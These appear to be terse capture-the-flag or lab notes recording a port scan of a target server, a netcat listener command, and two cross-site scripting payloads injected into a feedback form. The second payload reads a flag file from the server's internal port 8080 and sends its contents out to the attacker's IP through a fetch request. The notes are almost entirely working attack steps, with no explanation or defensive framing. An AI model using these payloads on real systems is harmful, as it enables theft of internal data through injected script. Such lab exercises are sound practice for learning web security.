My IP: 10.9.2.114
Server IP: 10.10.130.117

Notes:
Ports:
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8080/tcp open  http-proxy syn-ack


Started listening using netcat:
nc -lnvp 4444

Injected xss into feedback form:
`</textarea><script>fetch('http://10.9.2.114:444');</script>`

`</textarea><script>async function a() {const res1 = await fetch('http://127.0.0.1:8080/flag.txt');const b = await res1.text();const res2 = await fetch('http://10.9.2.114:444?a=' + b);}a();</script>`

![[Pasted image 20250125165156.png]]
